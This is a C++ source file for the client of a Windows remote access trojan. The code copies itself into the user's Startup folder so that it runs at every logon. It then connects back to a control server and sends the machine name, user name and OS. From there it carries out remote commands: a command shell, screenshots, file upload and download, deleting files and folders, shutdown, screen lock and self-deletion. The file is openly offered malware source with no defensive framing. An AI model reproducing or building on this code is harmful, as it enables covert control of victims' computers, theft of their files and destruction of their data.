// Standard Libraries
#include <iostream>
#include <windows.h>
#include <fstream>
#include <dirent.h>
#include <vector>
using namespace std;

const string SERVER = "";
const int PORT = 5005;

char buffer[1024];
const int TIMEOUT = 150000;
bool startup = true;

SOCKET objSocket;
string appdata = string(getenv("APPDATA"));
vector<string> fileLog;

// Identify Operating System
#ifdef _WIN64
string OperatingSystem = "Windows 64-Bit";
#elif _WIN32
string OperatingSystem = "Windows 32-Bit";
#elif __linux__
string OperatingSystem = "Linux";
#else
string OperatingSystem = "Other";
#endif

// Third Party Libraries
#include "functions.cpp"
#include "MessageBox.cpp"
#include "ChangeWallpaper.cpp"
#include "StartProcess.cpp"
#include "screenshot.cpp"
#include "RemoteCMD.cpp"
#include "ViewFiles.cpp"
#include "SendFile.cpp"
#include "ReceiveFile.cpp"
#include "MoveFile.cpp"
#include "DeleteFile.cpp"
#include "DeleteDirectory.cpp"
#include "DeleteSelf.cpp"

void RegisterStartup(string fileName)
{
    string startupPath = "C:/Users/" + (string)getenv("USERNAME") + 
        "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";

    fileName.erase(fileName.length() - 4);
    fileName = fileName + ".exe";
    startupPath += fileName;

    ifstream clientFile(startupPath);
    if (!clientFile.is_open()) CopyFileA(fileName.data(), startupPath.data(), 0);
}

int main()
{
    if (startup) RegisterStartup(__FILE__);

    WSADATA wsdata;
    if (WSAStartup(MAKEWORD(2, 2), &wsdata) != 0) return EXIT_FAILURE;

    objSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (objSocket == SOCKET_ERROR) return EXIT_FAILURE;

    sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(PORT);
    client.sin_addr.s_addr = inet_addr(SERVER.c_str());
    setsockopt(objSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&TIMEOUT, sizeof(TIMEOUT));

    if (connect(objSocket, (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
        closesocket(objSocket);
        WSACleanup(); main();
    }
    else sendall((string)getenv("COMPUTERNAME") + "|" + getenv("USERNAME") + "|" + OperatingSystem);

    while (true)
    {
        int check = recv(objSocket, buffer, sizeof(buffer), 0);
        if (check == 0 || check == SOCKET_ERROR) {
            clearLogs(); closesocket(objSocket);
            WSACleanup(); main();
        
        } string RemoteCommand = buffer;

        if (RemoteCommand == "terminate") {
            clearLogs(); closesocket(objSocket);
            WSACleanup(); exit(0);
        }
        else if (RemoteCommand == "messagebox") {
            vbsMessageBox(recvall(getBufferSize()), appdata + "/message.vbs");
        }
        else if (RemoteCommand == "wallpaper") {
            ChangeWallpaper(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "startprocess") {
            StartProcess(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "screenshot") {
            CaptureScreenshot();
        }
        else if (RemoteCommand == "cmd") {
            RemoteCMD();
        }
        else if (RemoteCommand == "shutdown") {
            system("shutdown /p");
        }
        else if (RemoteCommand == "restart") {
            system("shutdown /r");
        }
        else if (RemoteCommand == "lock") {
            system("rundll32.exe user32.dll,LockWorkStation");
        }
        else if (RemoteCommand == "directory") {
            sendall(getcwd(buffer, sizeof(buffer)));
        }
        else if (RemoteCommand == "viewfiles") {
            ViewFiles(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "receivefile") {
            SendFile(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "sendfile") {
            ReceiveFile(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "movefile") {
            MoveFile(recvall(getBufferSize()), recvall(getBufferSize()));
        }
        else if (RemoteCommand == "deletefile") {
            DeleteFile(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "deletedirectory") {
            DeleteDirectory(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "deleteself") {
            DeleteSelf(__FILE__);
            exit(0);
        }
        memset(buffer, 0, sizeof(buffer));
    }
}
